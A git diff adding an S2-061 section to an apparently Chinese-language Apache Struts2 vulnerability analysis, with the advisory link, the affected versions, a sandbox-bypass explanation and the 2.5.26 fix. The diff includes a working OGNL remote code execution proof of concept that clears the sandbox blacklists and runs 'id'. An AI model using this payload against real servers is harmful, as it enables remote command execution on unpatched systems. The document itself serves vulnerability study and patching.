@@ -1493,15 +1493,51 @@ Struts2 `2.5.22`版本并没有对漏洞点进行修复，而是在`2.5.20`版�
 <a name="s2-061"></a>
 ## S2-061
 
+官方漏洞公告：https://cwiki.apache.org/confluence/display/WW/S2-061
+
+影响版本：Struts 2.0.0 - Struts 2.5.25
+
 ## 漏洞复现与分析
 
+该漏洞是S2-059的绕过。前面分析S2-059时说过，从`2.5.20`版本开始，随着安全沙盒的增强，使得在`2.5.20`之后，利用OGNL表达式进行远程代码执行受到了很大的限制，并无公开的沙盒绕过的利用，直到S2-061的出现。
 
+因此漏洞原理和S2-059是一样的。下面来看看已公开的命令执行PoC是如何绕过沙盒的。
 
 ## 可回显PoC
 
+```
+%{
+(#instancemanager=#application['org.apache.tomcat.InstanceManager']).
+(#stack=#attr['com.opensymphony.xwork2.util.ValueStack.ValueStack']).
+(#bean=#instancemanager.newInstance('org.apache.commons.collections.BeanMap')).
+(#bean.setBean(#stack)).
+(#context=#bean.get('context')).
+(#bean.setBean(#context)).
+(#macc=#bean.get('memberAccess')).
+(#bean.setBean(#macc)).
+(#emptyset=#instancemanager.newInstance('java.util.HashSet')).
+(#bean.put('excludedClasses',#emptyset)).
+(#bean.put('excludedPackageNames',#emptyset)).
+(#arglist=#instancemanager.newInstance('java.util.ArrayList')).
+(#arglist.add('id')).
+(#execute=#instancemanager.newInstance('freemarker.template.utility.Execute')).
+(#execute.exec(#arglist))}
+```
+
+<img src="pic/struts2_s2-061_1.png">
 
 
 ## 漏洞修复
+
+通过版本比对，Struts2在`2.5.26`版本，不仅修复了漏洞触发点，还扩充了包名黑名单以增强沙盒。
+
+1、修改了`UIBean#setId()`，从而避免OGNL表达式二次解析。
+
+<img src="pic/struts2_s2-061_3.png">
+
+2、在包名黑名单中添加了属于各种中间件(如：Tomcat、JBoss、Weblogic、Jetty、Websphere)的包名。
+
+<img src="pic/struts2_s2-061_2.png">
 
 
 <a name="reference"></a>
